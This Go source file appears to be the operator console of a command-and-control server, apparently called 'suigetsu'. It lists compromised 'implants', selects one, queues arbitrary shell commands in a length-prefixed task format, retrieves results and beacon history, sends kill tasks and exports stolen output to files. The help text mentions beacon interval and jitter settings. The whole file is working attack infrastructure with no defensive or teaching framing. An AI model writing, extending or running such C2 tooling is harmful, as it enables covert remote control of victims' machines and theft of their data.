package shell
import(
	"bufio"
	"fmt"
	"os"
	"strings"
	"suigetsu/server/listeners"
)

type Shell struct {
	currentImplant string
	manager *listeners.Manager
}

func NewShell(m *listeners.Manager) *Shell {
	return &Shell{manager: m}
}

func (s *Shell) Run() {
	br := bufio.NewScanner(os.Stdin)
	println("Welcome to the shell. Type 'exit' to quit.")
	for {
		fmt.Print("> ")
		br.Scan()
		input := br.Text()
		if input == "exit" {
			break
		}
		s.handleCommand(input)
	}
}	

func (s *Shell) handleCommand(input string) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}
	switch parts[0] {
	case "list":
		implants, err := s.manager.Queue.ListImplants()
		if err != nil {
			fmt.Println("Error listing implants:", err)
			return
		}
		if len(implants) == 0 {
			fmt.Println("No registered implants.")
			return
		}
		fmt.Printf("%-34s %-20s %-20s %s\n", "IMPLANT ID", "FIRST SEEN", "LAST SEEN", "INFO")
		for _, imp := range implants {
			fmt.Printf("%-34s %-20s %-20s %s\n", imp.ID, imp.FirstSeen, imp.LastSeen, imp.Info)
		}
	case "use":
		if len(parts) < 2 {
			fmt.Println("Usage: use <implant_id>")
			return
		}
		s.currentImplant = parts[1]
		fmt.Println("using implant:", s.currentImplant)
	case "task":
		if len(parts) < 2 {
			fmt.Println("Usage: task <command>")
			return
		}
		if s.currentImplant == "" {
			fmt.Println("No implant selected.")
			return
		}
		cmd := strings.Join(parts[1:], " ")
		cmdBytes := []byte(cmd)
		buf := make([]byte, 5+len(cmdBytes))
		buf[0] = 0 // TASK_SHELL
		buf[1] = byte(len(cmdBytes) >> 24)
		buf[2] = byte(len(cmdBytes) >> 16)
		buf[3] = byte(len(cmdBytes) >> 8)
		buf[4] = byte(len(cmdBytes))
		copy(buf[5:], cmdBytes)
		err := s.manager.Queue.AddTask(s.currentImplant, string(buf))
		if err != nil {
			fmt.Println("Error adding task:", err)
			return
		}
		fmt.Println("Task queued.")
	case "results":
		if s.currentImplant == "" {
			fmt.Println("No implant selected. Use 'use <implant_id>' to select an implant.")
			return
		}
		results, err := s.manager.Queue.GetResults(s.currentImplant)
		if err != nil {
			fmt.Println("Error fetching results:", err)
			return
		}
		for _, r := range results {
			fmt.Println(r)
		}
	case "config":
		//todo
	case "kill":
		if s.currentImplant == "" {
			fmt.Println("No implant selected. Use 'use <implant_id>' to select an implant.")
			return
		}
		buf := []byte{4, 0, 0, 0, 0}
		err := s.manager.Queue.AddTask(s.currentImplant, string(buf))
		if err != nil {
			fmt.Println("Error adding kill task:", err)
			return
		}
		fmt.Println("Kill task queued.")
	case "history":
		if s.currentImplant == "" {
			fmt.Println("No implant selected. Use 'use <implant_id>' to select an implant.")
			return
		}
		history, err := s.manager.Queue.GetHistory(s.currentImplant)
		if err != nil {
			fmt.Println("Error fetching history:", err)
			return
		}
		for _, h := range history {
			fmt.Println(h)
		}
	case "export":
		if s.currentImplant == "" {
			fmt.Println("No implant selected. Use 'use <implant_id>' to select an implant.")
			return
		}
		results, err := s.manager.Queue.GetResults(s.currentImplant)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		f, err := os.Create(s.currentImplant + "_results.txt")
		if err != nil {
			fmt.Println("Error creating file:", err)
			return
		}
		defer f.Close()
		for _, r := range results {
			f.WriteString(r + "\n")
		}
		fmt.Println("Results exported to", s.currentImplant+"_results.txt")
	case "help":
		fmt.Println("commands:")
		fmt.Println("  list           - show active implants")
		fmt.Println("  use <id>       - select implant")
		fmt.Println("  task <cmd>     - send command")
		fmt.Println("  results        - show task results")
		fmt.Println("  config         - set interval/jitter/window")
		fmt.Println("  kill           - terminate implant")
		fmt.Println("  history        - show beacon history")
		fmt.Println("  export         - dump results to file")
		fmt.Println("  help           - show this help")
	default:
		fmt.Println("Unknown command:", parts[0])
	}
}